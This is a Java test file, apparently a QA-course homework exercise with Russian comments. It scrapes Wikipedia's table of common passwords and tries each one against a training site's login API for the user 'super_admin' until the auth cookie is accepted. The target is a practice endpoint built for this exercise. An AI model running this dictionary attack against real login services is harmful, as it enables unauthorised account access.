import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;
import org.junit.jupiter.api.Test;

import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class Ex9PasswordCrackTest {

    public HashSet<String> returnPassword() throws NullPointerException {

        Response response = io.restassured.RestAssured
                .get("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords")
                .andReturn();

        String html = response.asString();

        Document doc = Jsoup.parse(html);

        Elements tables = doc.select("table.wikitable");
        Element targetTable = null;

        for (Element table : tables) {
            Element caption = table.selectFirst("caption");
            if (caption != null && caption.text().contains("Top 25 most common passwords by year according to SplashData")) {
                targetTable = table;
                break;
            }
        }

        HashSet<String> uniqueValues = new HashSet<>();

        Elements rows = targetTable.select("tr");
        for (int i = 1; i < rows.size(); i++) {
            Element row = rows.get(i);
            Elements cells = row.select("td");

            for (Element cell : cells) {
                uniqueValues.add(cell.text().trim());
            }
        }

        return uniqueValues;
    }

    public String get_secret_password_homework(String password) { // Предложенное наименование, конечно, не отвечает стандаотам Джавы. Явно из курса по Питону. На питоне, конечно, задача решалась бы намного проще(((

        Map<String, String> data = new HashMap<>();
        data.put("login", "super_admin");
        data.put("password", password);

        Response response = RestAssured
                .given()
                .body(data)
                .when()
                .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                .andReturn();

        return response.getCookie("auth_cookie");
    }

    public String check_auth_cookie(String cookie) {  // Тоже нейминг неудачный

        Map<String, String> cookies = new HashMap<>();
        cookies.put("auth_cookie", cookie);

        Response responseForCheck = RestAssured
                .given()
                .cookies(cookies)  // Используем куки
                .when()
                .post("https://playground.learnqa.ru/api/check_auth_cookie")
                .andReturn();

        return responseForCheck.getBody().asString();
    }

    @Test
    public void crackingPassword() {
        HashSet<String> passwords = returnPassword();
        String answer = "You are NOT authorized";
        String rightPassword = "null";

        for (String password: passwords) {
            answer = check_auth_cookie(get_secret_password_homework(password));
            if(!answer.equals("You are NOT authorized")) {
                rightPassword = password;
                break;
            }
        }

        if(!answer.equals("You are NOT authorized")) {
            System.out.println(answer);
            System.out.println("Правильный пароль - " + rightPassword);
        } else {System.out.println(answer);}
    }
}
